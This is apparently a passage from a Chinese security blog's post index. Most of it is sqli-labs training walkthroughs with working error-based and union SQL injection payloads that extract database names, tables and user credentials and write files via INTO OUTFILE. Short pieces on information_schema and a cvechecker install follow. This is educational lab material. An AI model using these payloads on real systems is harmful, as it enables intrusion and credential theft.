color=\"red\">一种语法正确（在编译时是正确的）而运行时会出错的sql查询语句，并且错误信息中包含数据局相关信息</font>。一些天才的研究人员发现，可以使用聚合函数 group by子句，并结合随机函数rand()，在运行过程中有可能出错。</p>\n<h2 id=\"1-3-构造编译正确，运行可能出错的sql\"><a href=\"#1-3-构造编译正确，运行可能出错的sql\" class=\"headerlink\" title=\"1.3 构造编译正确，运行可能出错的sql\"></a>1.3 构造编译正确，运行可能出错的sql</h2><h3 id=\"1-3-1-随机函数rand\"><a href=\"#1-3-1-随机函数rand\" class=\"headerlink\" title=\"1.3.1 随机函数rand()\"></a>1.3.1 随机函数rand()</h3><table>\n<thead>\n<tr>\n<th>sql</th>\n<th>结果</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>select rand()</td>\n<td>0~1 之间的随机值</td>\n</tr>\n<tr>\n<td>select rang()*2</td>\n<td>0~2 之间的随机值</td>\n</tr>\n<tr>\n<td>select floor(rand()<em>2</em>)</td>\n<td>0 1 两个整数随机出现</td>\n</tr>\n<tr>\n<td>select database()</td>\n<td>当前数据库</td>\n</tr>\n<tr>\n<td>select concat((select database()),0x20,floor(rand()*2))a</td>\n<td>{当前数据库}{空格}{0 1中的一个}</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f768u2z3a9j30b606wt8v.jpg\" alt=\"\"></p>\n<h3 id=\"1-3-2-group-by\"><a href=\"#1-3-2-group-by\" class=\"headerlink\" title=\"1.3.2 group by\"></a>1.3.2 group by</h3><p><code>select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a</code><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f768yvdsh6j30je077jrw.jpg\" alt=\"\"></p>\n<p>重复执行多次，得到的 count(*) 不一样<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f7690aziijj30jd079gm8.jpg\" alt=\"\"></p>\n<p>最终会出现如下错误：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f76920orxwj30kc0a6dhf.jpg\" alt=\"\"></p>\n<p>错误信息中会显示当前数据库名 information_schema</p>\n<p><font color=\"red\">产生错误的原因：</font><br>group by 语句报错的原因是 <code>floor(rand()*2)</code> 的不确定性，即结果可能为 0 也可能为 1。group by key 的原理是循环读取数据的每一行，将结果保存在临时表中，读取每一行的key时，如果key在于临时表中，则不更新临时表中的数据；如果该key不在于临时表中，则在临时表中插入key所在行的数据。<br><code>group by floor(rand() * 2)</code>  出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下 <code>floor(rand()*2)</code> 可能 为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 <code>floor(rand()*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>\n<h2 id=\"1-4-获取数据库信息\"><a href=\"#1-4-获取数据库信息\" class=\"headerlink\" title=\"1.4 获取数据库信息\"></a>1.4 获取数据库信息</h2><ul>\n<li>参数 $id = <code>&#39; union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23</code></li>\n<li>网址  <code>http://localhost/sqli-labs-master/Less-5/?id=%27%20union%20select%201,count(*),concat((select%20database()),0x20,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a%23</code></li>\n<li>sql 语句：<code>select col1,col2,col3 from tables where id = &#39;&#39; union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23&#39; limit 0,1</code></li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f769ox9w4ij30cb03x3yl.jpg\" alt=\"\"></p>\n<p>刷新多次之后，出现如下错误：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f769kss9wtj30cc03waa8.jpg\" alt=\"\"></p>\n<p><font color=\"red\">将 database() 换成任何想获取的信息</font><br>例如表名，则参数为<br>$id = <code>&#39; union select 1,count(*),concat((select group_concat(distinct table_name) from information_schema.tables where table_schema = database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23</code><br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f769qoh0xbj30h703xdg6.jpg\" alt=\"\"></p>\n<p>其他信息获取方式参见 <a href=\"http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/\">sqli labs lesson 1~4 学习</a> lesson 1</p>\n<h1 id=\"2-lesson-6-基于错误-双引号二次注入\"><a href=\"#2-lesson-6-基于错误-双引号二次注入\" class=\"headerlink\" title=\"2 lesson 6 基于错误-双引号二次注入\"></a>2 lesson 6 基于错误-双引号二次注入</h1><p>$id = <code>&quot; union select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23</code></p>\n<p>将单引号换成双引号，其他同上。</p>\n<h1 id=\"3-lesson-7-outfile-下载数据库\"><a href=\"#3-lesson-7-outfile-下载数据库\" class=\"headerlink\" title=\"3 lesson 7 outfile 下载数据库\"></a>3 lesson 7 outfile 下载数据库</h1><h2 id=\"outfile-函数\"><a href=\"#outfile-函数\" class=\"headerlink\" title=\"outfile 函数\"></a>outfile 函数</h2><ul>\n<li>select…into outfile ‘file_name’形式的 select 可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此你必须拥有FILE权限，才能使用此语法。</li>\n<li>输出不能是一个已存在的文件。防止文件数据被篡改。</li>\n<li>你需要有一个登陆服务器的账号来检索文件。否则 select…into outfile 不会起任何作用。 </li>\n<li>在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除</li>\n</ul>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f76zlw41sbj30g7046t92.jpg\" alt=\"sql\"></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f76zal94ldj30g604igml.jpg\" alt=\"hello.txt\"><br>有可能会因为目录没有 file 权限，在文件夹中没有生成 TXT 文件，多试几个目录或文件夹。</p>\n<p>若我们想把一个可执行2进制文件用into outfile函数导出，导出后就会被破坏，因为into outfile函数会在行末端写入新行，并且会会转义换行符这样的话这个2进制可执行文件就会被破坏。这时候我们用into dumpfile 就能导出一个完整能执行的2进制文件，into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。在udf提权的时候用到的就是dumpfile。但是dumpfile 一次只能导出一行。</p>\n<h2 id=\"通过-outfile-获取数据库数据\"><a href=\"#通过-outfile-获取数据库数据\" class=\"headerlink\" title=\"通过 outfile 获取数据库数据\"></a>通过 outfile 获取数据库数据</h2><p>$id = <code>1&#39;)) union select user(),database(),version() into outfile &#39;D:\\7.txt&#39;%23</code></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1f76zl5t95vj30g803o74f.jpg\" alt=\"\"></p>\n<p>虽然页面上会显示错误，但是 D 盘会生成 7.txt 文件<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f76zj3s9suj30ga04bwez.jpg\" alt=\"\"></p>\n<p>其他信息获取方式参见 <a href=\"http://huirong.github.io/2016/08/24/sqli-labs-series-part1-4/\">sqli labs lesson 1~4 学习</a> lesson 1</p>\n<h1 id=\"4-参考文献\"><a href=\"#4-参考文献\" class=\"headerlink\" title=\"4 参考文献\"></a>4 参考文献</h1><p><a href=\"http://dummy2dummies.blogspot.com/2012/06/sqli-lab-series-part-6.html\" target=\"_blank\" rel=\"external\">SQLI-LABS SERIES PART 6,7</a></p>\n"},{"title":"sqli labs lesson 1~4 学习","url":"http://huirong.github.io/2016/08/24/sqli-labs-series-lesson1-4/","content":"<h1 id=\"1-lesson-1：基于错误-–-单引号\"><a href=\"#1-lesson-1：基于错误-–-单引号\" class=\"headerlink\" title=\"1 lesson 1：基于错误 – 单引号\"></a>1 lesson 1：基于错误 – 单引号</h1><h2 id=\"1-1-测试\"><a href=\"#1-1-测试\" class=\"headerlink\" title=\"1.1 测试\"></a>1.1 测试</h2><p>输入URL  <code>http://localhost/sqli-labs-master/Less-1/?id=1</code><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f75rh022ipj30fy05xdgk.jpg\" alt=\"\"></p>\n<p>在上述网址后面添加单引号 ‘   <code>http://localhost/sqli-labs-master/Less-1/?id=1%27</code><br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f75rvy5dn9j30nq05mmyk.jpg\" alt=\"\"></p>\n<p>根据错误信息，推测sql语句类似  <code>SELECT * FROM tables WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>\n<font color=\"red\">$id是被单引号包裹的</font>\n\n<h2 id=\"1-2-猜测字段个数\"><a href=\"#1-2-猜测字段个数\" class=\"headerlink\" title=\"1.2 猜测字段个数\"></a>1.2 猜测字段个数</h2><p>使用 order by 判断字段个数</p>\n<ul>\n<li>参数 $id = <code>&#39; order by 5#</code></li>\n<li>输入URL <code>http://localhost/sqli-labs-master/Less-1/?id=%27%20order%20by%205%23</code></li>\n<li>sql语句：<code>SELECT * FROM tables WHERE id=&#39;$id&#39; LIMIT 0,1</code>，将参数 $id = <code>&#39; order by 5#</code>带入，即得 <code>SELECT * FROM tables WHERE id=&#39;&#39; order by 5#&#39; LIMIT 0,1</code></li>\n<li>说明：浏览器对 URL 会转码；第一个单引号闭合sql语句中的单引号；#是数据库注释，注释掉后面的单引号和limit</li>\n</ul>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f75smugixtj30ca03xdfz.jpg\" alt=\"\"></p>\n<p>直到输入参数 $id = <code>&#39; order by 3#</code>，页面正常显示<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1f75sddgu6hj30c903wq2v.jpg\" alt=\"\"></p>\n<font color=\"red\"><br>说明原sql语句的结果有三个字段<br>sql 语句类似 <code>select col1,col2,col3 from tables where id = &#39;$id&#39; limit 0,1</code><br></font>\n\n<h2 id=\"1-3-union-查询数据库版本和数据库名\"><a href=\"#1-3-union-查询数据库版本和数据库名\" class=\"headerlink\" title=\"1.3 union 查询数据库版本和数据库名\"></a>1.3 union 查询数据库版本和数据库名</h2><ul>\n<li>参数 $id = <code>&#39; union select 1,2,3%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,2,3%23</code></li>\n</ul>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f75sscqjybj30cb03xq38.jpg\" alt=\"\"></p>\n<p>查看版本和数据库</p>\n<ul>\n<li>参数 $id = <code>&#39; union select 1,version(),database()%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,version(),database()%23</code></li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f75sni3booj30cb03v0t3.jpg\" alt=\"\"></p>\n<ul>\n<li>数据库版本 5.6.17</li>\n<li>数据库名 security</li>\n</ul>\n<h2 id=\"1-4-利用-information-schema-获得信息\"><a href=\"#1-4-利用-information-schema-获得信息\" class=\"headerlink\" title=\"1.4 利用 information_schema 获得信息\"></a>1.4 利用 information_schema 获得信息</h2><p>关于 information_schema 数据库信息，参见 <a href=\"http://huirong.github.io/2016/08/24/information-schema/\">INFORMATION_SCHEMA 数据库</a></p>\n<h3 id=\"1-4-1-数据库名\"><a href=\"#1-4-1-数据库名\" class=\"headerlink\" title=\"1.4.1 数据库名\"></a>1.4.1 数据库名</h3><ul>\n<li>参数 $id = <code>&#39; union select 1,2,(select group_concat(distinct schema_name) from information_schema.schemata)%23</code></li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f75sx1egqnj30sc03xdgt.jpg\" alt=\"\"></p>\n<p>本地数据库中的数据有：information_schema,challenges,mysql,performance_schema,security,test<br>本项目的数据库为：security</p>\n<h3 id=\"1-4-2-表名\"><a href=\"#1-4-2-表名\" class=\"headerlink\" title=\"1.4.2 表名\"></a>1.4.2 表名</h3><ul>\n<li>参数 $id = <code>&#39; union select 1,2,(select group_concat(distinct table_name) from information_schema.tables where table_schema = &quot;security&quot;)%23</code></li>\n</ul>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f75tjf3xqdj30ft045jry.jpg\" alt=\"\"></p>\n<p>security 数据中的表：emails,referers,uagents,users</p>\n<h3 id=\"1-4-3-字段名\"><a href=\"#1-4-3-字段名\" class=\"headerlink\" title=\"1.4.3 字段名\"></a>1.4.3 字段名</h3><ul>\n<li>参数 $id = <code>&#39; union select 1,2,(select group_concat(distinct column_name) from information_schema.columns where table_schema = &quot;security&quot;)%23</code></li>\n</ul>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f75torfahjj30oe04g759.jpg\" alt=\"\"></p>\n<p>users 表中的字段：id,email_id,referer,ip_address,uagent,username,password</p>\n<h3 id=\"1-4-4-账号和密码\"><a href=\"#1-4-4-账号和密码\" class=\"headerlink\" title=\"1.4.4 账号和密码\"></a>1.4.4 账号和密码</h3><ul>\n<li>参数 $id = <code>&#39; union select 1,(select group_concat(distinct username) from users),(select group_concat(distinct password) from users)%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-1/?id=%27%20union%20select%201,(select%20group_concat(distinct%20username)%20from%20users),(select%20group_concat(distinct%20password)%20from%20users)%23</code></li>\n</ul>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f75ttggpvjj311503fdi1.jpg\" alt=\"\"></p>\n<h1 id=\"2-lesson-2-基于错误-–-数字型\"><a href=\"#2-lesson-2-基于错误-–-数字型\" class=\"headerlink\" title=\"2 lesson 2 基于错误 – 数字型\"></a>2 lesson 2 基于错误 – 数字型</h1><h2 id=\"2-1-测试\"><a href=\"#2-1-测试\" class=\"headerlink\" title=\"2.1 测试\"></a>2.1 测试</h2><ul>\n<li>参数 $id = <code>1&#39;</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-2/?id=1%27</code></li>\n<li>错误 <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></li>\n</ul>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f76056s2twj30zh02xmy3.jpg\" alt=\"\"></p>\n<p>说明sql语句类似：<code>select * from tables where id = $id LIMIT 0,1</code>，没有单引号，直接是数字型。</p>\n<h2 id=\"2-2-数据库版本和名称\"><a href=\"#2-2-数据库版本和名称\" class=\"headerlink\" title=\"2.2 数据库版本和名称\"></a>2.2 数据库版本和名称</h2><ul>\n<li>参数 $id = <code>1 and 1=0 union select 1,2,3%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-2/?id=1%20and%201=0%20union%20select%201,version(),database()%23</code></li>\n</ul>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f760kucepdj30cb03x74o.jpg\" alt=\"\"></p>\n<p>其他步骤同 lesson 1。</p>\n<h1 id=\"3-lesson-3-基于错误-有括号单引号\"><a href=\"#3-lesson-3-基于错误-有括号单引号\" class=\"headerlink\" title=\"3 lesson 3 基于错误-有括号单引号\"></a>3 lesson 3 基于错误-有括号单引号</h1><h2 id=\"3-1-测试\"><a href=\"#3-1-测试\" class=\"headerlink\" title=\"3.1 测试\"></a>3.1 测试</h2><ul>\n<li>参数 $id = <code>1&#39;</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-3/?id=1%27</code></li>\n<li>错误 <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f760hn80gvj310e0353zg.jpg\" alt=\"\"></li>\n</ul>\n<p>sql 语句 select * from tables where id = (‘$id’) limit 0,1</p>\n<h2 id=\"3-2-数据库版本和名称\"><a href=\"#3-2-数据库版本和名称\" class=\"headerlink\" title=\"3.2 数据库版本和名称\"></a>3.2 数据库版本和名称</h2><ul>\n<li>参数 $id = <code>&#39;) union select 1,version(),database()%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-3/?id=%27)%20union%20select%201,version(),database()%23</code></li>\n</ul>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f760mzp1alj30cb03xgm0.jpg\" alt=\"\"></p>\n<h1 id=\"4-lesson-4-基于错误-有括号双引号\"><a href=\"#4-lesson-4-基于错误-有括号双引号\" class=\"headerlink\" title=\"4 lesson 4 基于错误-有括号双引号\"></a>4 lesson 4 基于错误-有括号双引号</h1><h2 id=\"4-1-测试\"><a href=\"#4-1-测试\" class=\"headerlink\" title=\"4.1 测试\"></a>4.1 测试</h2><ul>\n<li>参数 $id = <code>1&#39;</code> 页面没有错误，继续测试  $id = <code>1&quot;</code> ，页面出错</li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-4/?id=1%22</code></li>\n<li>错误 <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></li>\n</ul>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f7610l00g9j310h02s3zh.jpg\" alt=\"\"></p>\n<p>sql 语句：select * from tables where id = (“$id”) limit 0,1</p>\n<h2 id=\"4-2-数据库版本和名称\"><a href=\"#4-2-数据库版本和名称\" class=\"headerlink\" title=\"4.2 数据库版本和名称\"></a>4.2 数据库版本和名称</h2><ul>\n<li>参数 $id = <code>&quot;) union select 1,version(),database()%23</code></li>\n<li>URL <code>http://localhost/sqli-labs-master/Less-4/?id=%22)%20union%20select%201,version(),database()%23</code></li>\n</ul>\n<h1 id=\"5-参考文献\"><a href=\"#5-参考文献\" class=\"headerlink\" title=\"5 参考文献\"></a>5 参考文献</h1><p><a href=\"http://dummy2dummies.blogspot.com/2012/06/sqli-lab-series-part2.html\" target=\"_blank\" rel=\"external\">SQLI-LABS SERIES PART - 2,3,4,5</a></p>\n"},{"title":"sqli labs 安装","url":"http://huirong.github.io/2016/08/24/sqli-labs-series-install/","content":"<p>好久没学习 Web 安全了，都去搞逆向去了，心血来潮，重温下Web 安全，就从最简单的sql注入开始<br><a id=\"more\"></a></p>\n<h1 id=\"1-sqli-labs-安装\"><a href=\"#1-sqli-labs-安装\" class=\"headerlink\" title=\"1 sqli labs 安装\"></a>1 sqli labs 安装</h1><ul>\n<li>搭建 wamp 集成环境，教程网上都有。</li>\n<li>从 <a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"external\">https://github.com/Audi-1/sqli-labs</a> 下载源码</li>\n<li>将加压后的源码放在 www 目录下</li>\n<li>打开sql-connections文件夹下的“db-creds.inc”文件 ，修改用户名密码为自己的</li>\n<li>打开浏览器，输入网址 <a href=\"http://localhost/sqli-labs-master\" target=\"_blank\" rel=\"external\">http://localhost/sqli-labs-master</a></li>\n<li>点击setup/resetDB 链接在你的mysql中创造数据库</li>\n<li>开始学习</li>\n</ul>\n<h1 id=\"2-基础知识\"><a href=\"#2-基础知识\" class=\"headerlink\" title=\"2 基础知识\"></a>2 基础知识</h1><h2 id=\"2-1-infromation-schema-数据库\"><a href=\"#2-1-infromation-schema-数据库\" class=\"headerlink\" title=\"2.1 infromation_schema 数据库\"></a>2.1 <a href=\"http://huirong.github.io/2016/08/24/information-schema/\">infromation_schema 数据库</a></h2><h2 id=\"2-2-注释\"><a href=\"#2-2-注释\" class=\"headerlink\" title=\"2.2 注释\"></a>2.2 注释</h2><ol>\n<li>#(请用%23来使用，一般会被转码)</li>\n<li>– (–后面加个空格，用%20或者+表示空格)</li>\n<li>/<em>  </em>/</li>\n</ol>\n<h1 id=\"3-参考文献\"><a href=\"#3-参考文献\" class=\"headerlink\" title=\"3 参考文献\"></a>3 参考文献</h1><p><a href=\"http://www.freebuf.com/articles/web/34619.html\" target=\"_blank\" rel=\"external\">安全科普：SQLi Labs 指南 Part 1</a></p>\n"},{"title":"INFORMATION_SCHEMA 数据库","url":"http://huirong.github.io/2016/08/24/information-schema/","content":"<p>INFORMATION_SCHEMA数据库作为MySQL数据库元数据的一个中央集中仓库存在。<br><a id=\"more\"></a></p>\n<h1 id=\"1-INFORMATION-SCHEMA-数据库\"><a href=\"#1-INFORMATION-SCHEMA-数据库\" class=\"headerlink\" title=\"1 INFORMATION_SCHEMA 数据库\"></a>1 INFORMATION_SCHEMA 数据库</h1><p>INFORMATION_SCHEMA 是一个“虚拟的数据库”，因为它不存放在磁盘任何位置。但它和其他数据库一样含有表，且表中的内容可以通过使用select语句和其它数据库一样查询访问。<br>此外，你还可以使用select来获取关于INFORMATION_SCHEMA其本身的信息。</p>\n<h1 id=\"2-information-schema-数据库表说明\"><a href=\"#2-information-schema-数据库表说明\" class=\"headerlink\" title=\"2 information_schema 数据库表说明\"></a>2 information_schema 数据库表说明</h1><table>\n<thead>\n<tr>\n<th>表名</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><font color=\"orange\">SCHEMATA</font></td>\n<td>提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">TABLES</font></td>\n<td>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">COLUMNS</font></td>\n<td>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">STATISTICS</font></td>\n<td>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">USER_PRIVILEGES（用户权限）</font></td>\n<td>给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">SCHEMA_PRIVILEGES（方案权限）</font></td>\n<td>给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">TABLE_PRIVILEGES（表权限）</font></td>\n<td>给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">COLUMN_PRIVILEGES（列权限）</font></td>\n<td>给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">CHARACTER_SETS（字符集）</font></td>\n<td>提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">COLLATIONS</font></td>\n<td>提供了关于各字符集的对照信息。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">TABLE_CONSTRAINTS</font></td>\n<td>描述了存在约束的表。以及表的约束类型。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">KEY_COLUMN_USAGE</font></td>\n<td>描述了具有约束的键列。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">ROUTINES</font></td>\n<td>提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">VIEWS</font></td>\n<td>给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</td>\n</tr>\n<tr>\n<td><font color=\"orange\">TRIGGERS</font></td>\n<td>提供了关于触发程序的信息。必须有super权限才能查看该表。</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"cvechecker 安装和使用教程","url":"http://huirong.github.io/2016/06/17/cvechecker/","content":"<p>cvechecker 通过扫描系统中已安装的软件列表，并将结果和CVE数据库匹配，报告系统中可能存在的漏洞。</p>\n<h1 id=\"1-安装\"><a href=\"#1-安装\" class=\"headerlink\" title=\"1 安装\"></a>1 安装</h1><ul>\n<li><p>下载 <a href=\"https://github.com/sjvermeu/cvechecker\" target=\"_blank\" rel=\"external\">cvechecker</a> 安装包<br>首先运行</p>\n<figure class=\"highlight brainfuck\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">autoreconf</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">force</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">install</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>运行标准配置命令（根据不同的环境，添加 –enable-*  选项）</p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure <span class=\"comment\">--enable-sqlite3</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><font color=\"orange\">如果不加 –enable-sqlite3 选项，安装好之后，初始化数据库的时候会出问题</font></p>\n<h1 id=\"2-待解决问题\"><a href=\"#2-待解决问题\" class=\"headerlink\" title=\"2 待解决问题\"></a>2 待解决问题</h1><h2 id=\"2-1-安装-libconfig\"><a href=\"#2-1-安装-libconfig\" class=\"headerlink\" title=\"2.1 安装 libconfig\"></a>2.1 安装 libconfig</h2><p>安装过程会出现如下问题：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1f5582ge5icj30k107qadf.jpg\" alt=\"\"></p>\n<p>需要安装 libconfig，下载 <a href=\"http://www.hyperrealm.com/libconfig/libconfig-1.5.tar.gz\" target=\"_blank\" rel=\"external\">libconfig</a> 安装包</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">cd</span> libconfig-<span class=\"number\">1.5</span>/</div><div class=\"line\">./configure</div><div class=\"line\"><span class=\"keyword\">make</span></div><div class=\"line\">sudo <span class=\"keyword\">make</span> install</div></pre></td></tr></table></figure>\n<h2 id=\"2-2-安装-sqlite3\"><a href=\"#2-2-安装-sqlite3\" class=\"headerlink\" title=\"2.2 安装 sqlite3\"></a>2.2 安装 sqlite3</h2><p>安装完 libconfig 之后，又会出现如下问题，缺少 sqlite3 包<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f558grmtpsj30k305ognw.jpg\" alt=\"\"></p>\n<p>安装 sqlite3<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get <span class=\"keyword\">install</span> sqlite3</div><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> <span class=\"keyword\">install</span> libsqlite3-dev</div><div class=\"line\">apt-<span class=\"keyword\">get</span> <span class=\"keyword\">install</span> libsqlite3-tcl</div></pre></td></tr></table></figure></p>\n<h1 id=\"3-编译安装\"><a href=\"#3-编译安装\" class=\"headerlink\" title=\"3 编译安装\"></a>3 编译安装</h1><p>./configure 运行成功后，编译安装</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">make</span></div><div class=\"line\">sudo <span class=\"built_in\">make</span> install</div></pre></td></tr></table></figure>\n<h1 id=\"4-使用\"><a href=\"#4-使用\" class=\"headerlink\" title=\"4 使用\"></a>4 使用</h1><ul>\n<li><p>初始化 SQLite3 数据库</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">cvechecker -i</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>加载 CVE 和版本匹配规则</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install xsltproc</div><div class=\"line\">pullcves pull</div></pre></td></tr></table></figure>\n</li>\n<li><p>生成需要扫描的文件</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo <span class=\"built_in\">find</span> / -<span class=\"built_in\">type</span> f -perm -o+x &gt; scanlist.txt</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/proc/version\"</span> &gt;&gt; scanlist.txt</div></pre></td></tr></table></figure>\n</li>\n<li><p>收集已经安装的软件列表</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cvechecker -<span class=\"selector-tag\">b</span> scanlist.txt</div></pre></td></tr></table></figure>\n</li>\n<li><p>输出匹配的 CVE 列表</p>\n<figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">sudo cvechecker -r</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>部分结果截图如下：<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1f55g7yrl64j30i80a8432.jpg\" alt=\"\"></p>\n<h1 id=\"5-参数解释\"><a href=\"#5-参数解释\" class=\"headerlink\" title=\"5 参数解释\"></a>5 参数解释</h1><figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><div 